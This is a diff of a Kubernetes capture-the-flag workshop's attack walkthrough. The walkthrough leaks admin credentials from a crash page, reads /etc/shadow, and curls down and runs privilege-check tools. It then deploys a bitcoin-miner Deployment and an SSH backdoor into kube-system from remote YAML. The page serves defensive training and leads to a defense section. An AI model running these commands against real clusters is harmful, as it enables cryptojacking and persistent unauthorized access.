@@ -48,55 +48,79 @@ The general process looks like this:
 
     Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.
 
-## Initial Access
+## Getting Access
 
-__Red__ purchased a bundle of leaked credentials online. One set of credentials appears to be for a publicly accessible kubernetes cluster. They've downloaded the creds and want to connect to the cluster to see what's available.
+__Red__ team found an app online and ran a [dictionary attack](https://www.techtarget.com/searchsecurity/definition/dictionary-attack) against it.  Some valid paths were `/crash` and `/admin`.  Let's try to find an exploit!
+
+To find the compromised website, run the following: `./workshop/scenario_1/attack-1-helper.sh`
+
+In your browser, go to URL provided (e.g. `http://<IP>:8080/`)
+
+Hmm.  "Nothing to see here."?  They're probably wrong.
+
+Let's try the Admin page: `http://<IP>:8080/admin`.  Hrm.  It's asking for credentials.  Since it was a browser popup (instead of an in-app request), it probably uses [Basic Auth](https://en.wikipedia.org/wiki/Basic_access_authentication).
+
+Let's try the Crash page: `http://<IP>:8080/crash`
+
+Looks like we've crashed the app!  And it prints out all of the environment variables.  Oh goodie.  There's two that seem to be especially interesting (AUTH_USERNAME and AUTH_PASSWORD).  Let's go back to the Admin page and try those.
+
+Go back to the Admin page: `http://<IP>:8080/admin` and enter the credentials we just got.  
+
+And we're in!  Looks like Frank left a backdoor to run some commands.  Let's see what we can learn:
 
 ```console
 id
 ```
+
 ```console
 uname -a
 ```
+
 ```console
-cat /etc/lsb-release /etc/redhat-release
+cat /etc/lsb-release
 ```
+
 ```console
 ps -ef
 ```
+
 ```console
 df -h
 ```
-```console
-netstat -nl
-```
 
-Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container.
-
-Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank">a basic Linux config auditor</a> to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel.
+Note that there are very few processes running. This is probably a container.
 
 ```console
 cat /etc/shadow
 ```
 ```console
-ls -l /home
+ls -l /
 ```
 ```console
-ls -l /root
+ls -l $PWD
 ```
 ```console
-cd /tmp; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
+echo $PATH
 ```
 
-That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:
+Can we add files to the default PATH?
+```console
+touch /usr/local/bin/foo && ls /usr/local/bin/
+```
 
 ```console
-cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
+cd /usr/local/bin; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
+```
+
+That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container and verify with [amicontained](https://github.com/genuinetools/amicontained):
+
+```console
+cd /usr/local/bin; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
 ```
 
 This tells us several things:
 
-* We are in a container, and it's managed by Kubernetes
+* We are in a container, and it's probably managed by Kubernetes
 * Some security features are not in use (userns)
 * Seccomp is disabled, but a number of Syscalls are blocked
 * We don't have any exciting capabilities. <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Click for more capabilities info.</a>
@@ -110,11 +134,12 @@ env | grep -i kube
 ls /var/run/secrets/kubernetes.io/serviceaccount
 ```
 
+# Deploy Bitcoin miner + backdoor
+
 We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:
 
 ```console
-export PATH=/tmp:$PATH
-cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
+cd /usr/local/bin; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
 ```
 ```console
 kubectl get all
@@ -134,58 +159,22 @@ kubectl auth can-i create pods
 
 It looks like we have hit the jackpot! Let's see if we can start mining some crypto.
 ```console
-cat > bitcoinero.yml <<EOF
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  labels:
-    run: bitcoinero
-  name: bitcoinero
-  namespace: dev
-spec:
-  replicas: 1
-  revisionHistoryLimit: 2
-  selector:
-    matchLabels:
-      run: bitcoinero
-  strategy:
-    rollingUpdate:
-      maxSurge: 25%
-      maxUnavailable: 25%
-    type: RollingUpdate
-  template:
-    metadata:
-      labels:
-        run: bitcoinero
-    spec:
-      containers:
-      - image: securekubernetes/bitcoinero:latest
-        name: bitcoinero
-        command: ["./moneymoneymoney"]
-        args:
-        - -c
-        - "1"
-        - -l
-        - "10"
-        resources:
-          requests:
-            cpu: 100m
-            memory: 128Mi
-          limits:
-            cpu: 200m
-            memory: 128Mi 
-EOF
-
-kubectl apply -f bitcoinero.yml
-sleep 10
-kubectl get pods
+kubectl apply -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml; sleep 10; kubectl get pods
 ```
 
 We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.
 
 ```console
-kubectl apply -n kube-system -f backdoor.yaml
-sleep 10
-echo "Save this IP for Attack Scenario #2"
+kubectl apply -n kube-system -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/backdoor.yaml
+```
+
+Wait ~10 seconds for the Public IP to be exposed
+```console
 kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'
 ```
+
+Our Bitcoin miner is now deployed and we've also deployed an SSH backdoor.  Mission Accomplished.
+
+## Completion
+
+You've completed Scenario 1 Attack.  Now let's go to [Scenario 1 Defense](scenario_1_defense/).
